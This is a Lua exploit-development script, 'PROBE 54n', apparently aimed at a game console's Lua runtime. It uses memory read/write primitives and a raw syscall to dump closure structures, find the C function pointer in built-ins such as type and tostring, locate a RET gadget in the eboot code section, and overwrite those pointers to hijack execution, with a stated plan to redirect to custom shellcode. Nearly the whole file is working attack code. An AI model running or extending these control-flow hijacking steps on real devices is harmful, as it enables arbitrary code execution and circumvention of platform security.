-- CRASH_CLASS: HIGH
-- PROBE 54n: CClosure redirect on REAL C functions
--
-- Context: 54m showed +0x30 redirect on a Lua closure always returns 42
-- regardless of what address is written — because Lua closures (LClosure)
-- are bytecode-interpreted and don't call through a C function pointer.
-- We need to test with REAL C functions (CClosure): print, type, tostring, etc.
-- These have a C function pointer that the VM actually calls.
--
-- Plan:
-- 1) Dump struct layout of known C functions (print, type, tostring, pcall)
-- 2) Compare with Lua closure layout to find structural differences
-- 3) Identify the C function pointer field
-- 4) Redirect to eboot RET gadget
-- 5) If that works: redirect to custom shellcode

print("=== PROBE 54n: REAL C FUNCTION REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(": ([0-9a-fA-F]+)") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex), hex end
    return nil, nil
end

-- Step 1: Dump struct layout of C functions vs Lua closures
print("[*] Step 1: Compare C function vs Lua closure struct layouts")
print("")

local targets = {
    {"print (C)",    print},
    {"type (C)",     type},
    {"tostring (C)", tostring},
    {"pcall (C)",    pcall},
    {"pairs (C)",    pairs},
    {"Lua closure",  function() return 42 end},
}

local cfunc_addrs = {}

for _, t in ipairs(targets) do
    local name, fn = t[1], t[2]
    local addr, hex = parse_func_addr(fn)
    if addr then
        print("  " .. name .. " at " .. hexval(addr))
        for off = 0, 0x48, 8 do
            local val = safe_rq(addr + off)
            print(string.format("    +0x%02X: %s", off, hexval(val)))
        end
        -- Check which offset has an eboot-range pointer (the C func ptr)
        -- Eboot is around 0x00000000_6xxxxxxx or 0x00000001_5xxxxxxx
        for off = 0, 0x48, 8 do
            local val = safe_rq(addr + off)
            if val then
                local h, l = get_hi_lo(val)
                -- C function pointers should be in executable code ranges
                -- eboot range seen: 0x00000001_52D10EE0 and 0x00000000_694FC000
                if (h == 0 and l >= 0x60000000 and l < 0x80000000) or
                   (h == 1 and l >= 0x40000000 and l < 0x60000000) then
                    print(string.format("    ^^^ +0x%02X looks like code pointer!", off))
                end
            end
        end
        print("")
        table.insert(cfunc_addrs, {name=name, addr=addr, fn=fn})
    else
        print("  " .. name .. " — could not parse address: " .. tostring(fn))
    end
end

-- Step 2: Identify the type tag difference between CClosure and LClosure
print("[*] Step 2: Type tag analysis")
-- In Lua 5.1: LClosure has tt=6 (LUA_TFUNCTION), CClosure has tt=6 too
-- But the struct differs: CClosure has f (C func ptr), LClosure has p (Proto*)
-- Offset +0x08 low byte might be the type tag or subtype
for _, t in ipairs(cfunc_addrs) do
    local val08 = safe_rq(t.addr + 0x08)
    if val08 then
        local h, l = get_hi_lo(val08)
        print(string.format("  %s +0x08: 0x%08X_%08X (low byte: 0x%02X)",
            t.name, h, l, l % 256))
    end
end

-- Step 3: Get eboot RET gadget
print("")
print("[*] Step 3: Find eboot RET gadget")
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)

if not text_lo or not text_hi then
    print("  Could not get eboot base")
    print("=== PROBE 54n ABORTED ===")
    return
end

local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("  eboot .text: " .. hexval(eboot_base))

-- Find RET
local ret_off = nil
for off = 0, 0xFFF do
    local dw = safe_rd(eboot_base + off)
    if dw then
        if (dw % 256) == 0xC3 then
            ret_off = off
            break
        end
        if (math.floor(dw / 256) % 256) == 0xC3 then
            ret_off = off + 1
            break
        end
        if (math.floor(dw / 65536) % 256) == 0xC3 then
            ret_off = off + 2
            break
        end
        if (math.floor(dw / 16777216) % 256) == 0xC3 then
            ret_off = off + 3
            break
        end
    end
end

if not ret_off then
    print("  No RET found in first 4KB")
    print("=== PROBE 54n ABORTED ===")
    return
end

local ret_lo = text_lo + ret_off
local ret_hi = text_hi
if ret_lo >= 0x100000000 then
    ret_hi = ret_hi + 1
    ret_lo = ret_lo - 0x100000000
end
local ret_addr = uint64(string.format("0x%X%08X", ret_hi, ret_lo))
print("  RET gadget: " .. hexval(ret_addr) .. " (eboot+" .. string.format("0x%X", ret_off) .. ")")

-- Step 4: Try redirect on each C function
-- For C functions, the C func ptr is likely at +0x30 (same as CClosure)
-- But we need to find which offset matters
print("")
print("[*] Step 4: Redirect C functions to RET gadget")

-- Test with 'type' — it's simple and returns a string
-- type("hello") should return "string"
-- If we redirect its C func ptr, calling type() should crash or return garbage

-- First verify type() works
local type_ok, type_ret = pcall(function() return type("hello") end)
print("  type('hello') before: " .. tostring(type_ret))

local type_addr = cfunc_addrs[2] and cfunc_addrs[2].addr
if type_addr then
    -- Try each offset that might be the C func pointer
    -- Based on struct dump, look for the eboot-range value
    local candidate_offsets = {}
    for off = 0, 0x48, 8 do
        local val = safe_rq(type_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if (h == 0 and l >= 0x60000000 and l < 0x80000000) or
               (h == 1 and l >= 0x40000000 and l < 0x60000000) then
                table.insert(candidate_offsets, off)
            end
        end
    end

    print("  Candidate C func ptr offsets: ")
    for _, off in ipairs(candidate_offsets) do
        print(string.format("    +0x%02X: %s", off, hexval(safe_rq(type_addr + off))))
    end

    -- Test each candidate offset
    for _, off in ipairs(candidate_offsets) do
        print("")
        print(string.format("  Testing +0x%02X redirect on type():", off))
        local old_val = safe_rq(type_addr + off)
        print("    Old value: " .. hexval(old_val))

        collectgarbage("stop")

        local wok = safe_wq(type_addr + off, ret_addr)
        print("    Write RET addr: " .. tostring(wok))

        if wok then
            local verify = safe_rq(type_addr + off)
            print("    Verify: " .. hexval(verify))

            -- Call type()
            local tok, tret = pcall(function() return type("hello") end)
            if tok then
                print("    >>> RETURNED: " .. tostring(tret) .. " (type: " .. type(tret) .. ")")
                if tret ~= "string" then
                    print("    >>> BEHAVIOR CHANGED! Offset +0x" .. string.format("%02X", off) .. " IS the C func ptr!")
                else
                    print("    >>> Same result — this offset is NOT the C func ptr")
                end
            else
                print("    >>> CRASHED: " .. tostring(tret))
                print("    >>> Offset +0x" .. string.format("%02X", off) .. " IS the C func ptr (crash = execution attempted)!")
            end
        end

        -- Restore
        safe_wq(type_addr + off, old_val)
        collectgarbage("restart")

        -- Verify restored
        local rok, rval = pcall(function() return type("hello") end)
        print("    After restore: type('hello') = " .. tostring(rval))

        -- If function is dead after restore, stop testing
        if not rok then
            print("    Function dead after restore, stopping tests")
            break
        end
    end
end

-- Step 5: Also test with 'tostring' for a second data point
print("")
print("[*] Step 5: Verify with tostring()")
local ts_addr = cfunc_addrs[3] and cfunc_addrs[3].addr
if ts_addr then
    -- Find code-range offset
    for off = 0, 0x48, 8 do
        local val = safe_rq(ts_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if (h == 0 and l >= 0x60000000 and l < 0x80000000) or
               (h == 1 and l >= 0x40000000 and l < 0x60000000) then
                print(string.format("  tostring C func candidate at +0x%02X: %s", off, hexval(val)))

                local old_val = safe_rq(ts_addr + off)
                collectgarbage("stop")
                safe_wq(ts_addr + off, ret_addr)

                local tok, tret = pcall(function() return tostring(123) end)
                if tok then
                    print("    tostring(123) = " .. tostring(tret))
                    if tret ~= "123" then
                        print("    >>> BEHAVIOR CHANGED!")
                    end
                else
                    print("    >>> CRASHED: " .. tostring(tret))
                end

                safe_wq(ts_addr + off, old_val)
                collectgarbage("restart")

                local rok, rval = pcall(function() return tostring(123) end)
                print("    After restore: " .. tostring(rval))
                break
            end
        end
    end
end

print("")
print("=== PROBE 54n COMPLETE ===")
